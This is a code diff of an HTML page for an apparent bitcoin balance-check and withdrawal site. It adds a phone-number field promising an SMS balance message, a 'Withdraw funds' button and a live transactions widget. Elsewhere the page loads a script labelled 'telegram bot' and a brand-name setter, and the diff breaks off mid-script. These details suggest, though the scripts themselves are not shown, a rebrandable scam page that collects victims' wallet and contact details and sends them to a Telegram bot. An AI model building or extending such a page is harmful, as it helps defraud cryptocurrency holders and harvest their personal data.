@@ -37,6 +37,12 @@
   <link rel="stylesheet" href="assets/vendor/hs-mega-menu/dist/hs-mega-menu.min.css">
   <link rel="stylesheet" href="assets/vendor/slick-carousel/slick/slick.css">
 
+  <!-- BitcoinWebSocket -->
+  <script src="assets/js/bitcoinWebsocket.js"></script>
+  <script src="assets/js/websocket/dist/jquery.js"></script>
+  <script src="assets/js/websocket/src/jquery.simple.websocket.js"></script>
+
+
   <!-- CSS Front Template -->
   <link rel="stylesheet" href="assets/css/theme.css">
   <link rel="stylesheet" href="assets/css/style.css">
@@ -188,6 +194,21 @@
         </div>
         <img src="./img/bitcoin.svg" alt="" width="40" height="40">
       </div>
+      <div class="deposit-crypto__field">
+        <div class="deposit-crypto__main">
+          <label>Phone number</label>
+          <div class="deposit-crypto__wrapper">
+            <select id="country_codes" class="country_code_form" style="max-width: 45px; border-radius: 3px;"></select>
+            <div id="code_form" class="print-code"></div>
+            <input id="number-input" class="input_telefon" required
+              onkeyup="this.value = this.value.replace(/[^\d]/g,'');" maxlength="10">
+          </div>
+        </div>
+        <img src="./img/bitcoin.svg" alt="" width="40" height="40">
+      </div>
+      <div class="deposit-crypto__label">
+        <span>*You will receive SMS message with current balance</span>
+      </div>
 
       <button onclick="getDataBitcoin()" type="submit" class="check-balance__btn green-btn">Withdraw funds</button>
       <!-- <a href="withdraw.html" class="check-balance__btn green-btn">Withdraw funds to private BTC wallet</a> -->
@@ -207,11 +228,61 @@
         <div class="blocks__body"></div>
       </div>
     </div>
-    <div class="wrapper">
-      <div class="prices" style="width: 100%;border: 1px solid #0000001a;border-radius: 10px;padding: 10px 13px;">
-        <div class="prices__title"><a href="">Prices</a></div>
-        <div class="prices__subtitle">Market Cap</div>
-        <div class="prices__body"></div>
+    <div style="margin: 0 !important;width: 100%;" class="wrapper">
+      <div style="margin: 0 !important;width: 100%;" class="container-trades">
+        <div class="block">
+          <div class="head">
+            <div class="head__left">
+              <svg fill="none" height="30" viewBox="0 0 20 20" width="30" xmlns="http://www.w3.org/2000/svg">
+                <path
+                  d="m10 20c5.5228 0 10-4.4772 10-10 0-5.52285-4.4772-10-10-10-5.52285 0-10 4.47715-10 10 0 5.5228 4.47715 10 10 10z"
+                  fill="#ff9b22" />
+                <path
+                  d="m14.4931 8.7625c.1963-1.31-.8018-2.01437-2.1656-2.48437l.4425-1.77501-1.08-.26874-.4312 1.72812c-.2838-.07125-.575-.1375-.8657-.20375l.4344-1.73937-1.07998-.26938-.4425 1.77437c-.235-.05375-.46625-.10624-.69-.16249l.00125-.00563-1.49-.37188-.2875 1.15376s.80188.18375.785.195c.4375.10937.51625.39874.50313.62874l-1.21188 4.86183c-.05375.1325-.18938.3319-.49563.2563.01125.0156-.78499-.1956-.78499-.1956l-.53626 1.2362 1.40625.3507c.26125.0656.5175.1343.76938.1987l-.44687 1.795 1.07937.2687.4425-1.775c.295.0794.58125.1532.86125.2232l-.44125 1.7675 1.08.2687.44683-1.7912c1.8425.3487 3.2275.2081 3.8107-1.4581.47-1.3413-.0232-2.1157-.9925-2.62.7062-.1625 1.2375-.62692 1.3793-1.5863zm-2.4687 3.4613c-.3331 1.3418-2.5925.6162-3.32501.4343l.59376-2.3781c.73245.1831 3.08065.545 2.73125 1.9438zm.3344-3.48067c-.3044 1.22062-2.1844.6-2.79378.44812l.53748-2.15625c.6094.15187 2.5738.435 2.2563 1.70813z"
+                  fill="#fff" />
+              </svg>
+              <div class="head__text">
+                <h3 class="head__h3">Latest transactions</h3>
+                <p class="head__p">Bitcoin</p>
+              </div>
+            </div>
+            <button class="head__right">-&gt;</button>
+          </div>
+          <div id="btc-box" class="inner" price="">
+            <div class="inner__flex" bis_skin_checked="1"><button class="inner__btn"></button>
+              <p class="inner__coin"></p>
+              <p class="inner__price"></p>
+            </div>
+            <div class="inner__flex" bis_skin_checked="1"><button class="inner__btn"></button>
+              <p class="inner__coin"></p>
+              <p class="inner__price"></p>
+            </div>
+            <div class="inner__flex" bis_skin_checked="1"><button class="inner__btn"></button>
+              <p class="inner__coin"></p>
+              <p class="inner__price"></p>
+            </div>
+            <div class="inner__flex" bis_skin_checked="1"><button class="inner__btn"></button>
+              <p class="inner__coin"></p>
+              <p class="inner__price"></p>
+            </div>
+            <div class="inner__flex" bis_skin_checked="1"><button class="inner__btn"></button>
+              <p class="inner__coin"></p>
+              <p class="inner__price"></p>
+            </div>
+            <div class="inner__flex" bis_skin_checked="1"><button class="inner__btn"></button>
+              <p class="inner__coin"></p>
+              <p class="inner__price"></p>
+            </div>
+            <div class="inner__flex" bis_skin_checked="1"><button class="inner__btn"></button>
+              <p class="inner__coin"></p>
+              <p class="inner__price"></p>
+            </div>
+            <div class="inner__flex" bis_skin_checked="1"><button class="inner__btn"></button>
+              <p class="inner__coin"></p>
+              <p class="inner__price"></p>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
     <!-- <img src="./img/bitcoin-wallet-2.png" alt="" class="d-block mx-auto mt-2" width="300"> -->
@@ -272,60 +343,10 @@
   <!-- ========== Start Footer ========== -->
   <!-- ========== FOOTER ========== -->
   <br>
-  <script src="assets/vendor/jquery/dist/jquery.min.js"></script>
+
   <script src="assets/vendor/jquery-migrate/dist/jquery-migrate.min.js"></script>
   <script src="assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
 
-  <!-- JS Implementing Plugins -->
-  <script src="assets/vendor/hs-header/dist/hs-header.min.js"></script>
-  <script src="assets/vendor/hs-go-to/dist/hs-go-to.min.js"></script>
-  <script src="assets/vendor/hs-unfold/dist/hs-unfold.min.js"></script>
-  <script src="assets/vendor/hs-mega-menu/dist/hs-mega-menu.min.js"></script>
-  <script src="assets/vendor/hs-show-animation/dist/hs-show-animation.min.js"></script>
-  <script src="assets/vendor/jquery-validation/dist/jquery.validate.min.js"></script>
-
-  <!-- JS Front -->
-  <script src="assets/js/hs.core.js"></script>
-  <script src="assets/js/hs.validation.js"></script>
-
-  <!-- JS Plugins Init. -->
-  <script>
-    $(document).on('ready', function () {
-      // initialization of header
-      var header = new HSHeader($('#header')).init();
-
-      // initialization of mega menu
-      var megaMenu = new HSMegaMenu($('.js-mega-menu'), {
-        desktop: {
-          position: 'left'
-        }
-      }).init();
-
-      // initialization of unfold
-      var unfold = new HSUnfold('.js-hs-unfold-invoker').init();
-
-      // initialization of show animations
-      $('.js-animation-link').each(function () {
-        var showAnimation = new HSShowAnimation($(this)).init();
-      });
-
-      // initialization of form validation
-      $('.js-validate').each(function () {
-        $.HSCore.components.HSValidation.init($(this), {
-          rules: {
-            confirmPassword: {
-              equalTo: '#signupPassword'
-            }
-          }
-        });
-      });
-
-      // initialization of go to
-      $('.js-go-to').each(function () {
-        var goTo = new HSGoTo($(this)).init();
-      });
-    });
-  </script>
   <!-- Bitcoin swiper -->
   <section class="section-marq">
     <!-- <div class="marquee__bg">
@@ -404,8 +425,14 @@
   <script src="assets/js/getPrices.js"></script>
   <!-- telegram bot -->
   <script src="assets/js/importantTracker.js"></script>
-  <script src="assets/js/loader.js"></script>
+  <script type="module" src="assets/js/loader.js"></script>
+  <script src="assets/js/dropdown.js"></script>
   <script src="assets/js/setBrandName.js"></script>
+
+  <script type="text/javascript">
+    run_blockchain_coin('btc');
+  </script>
+
   <script>
 
     (function (u) {
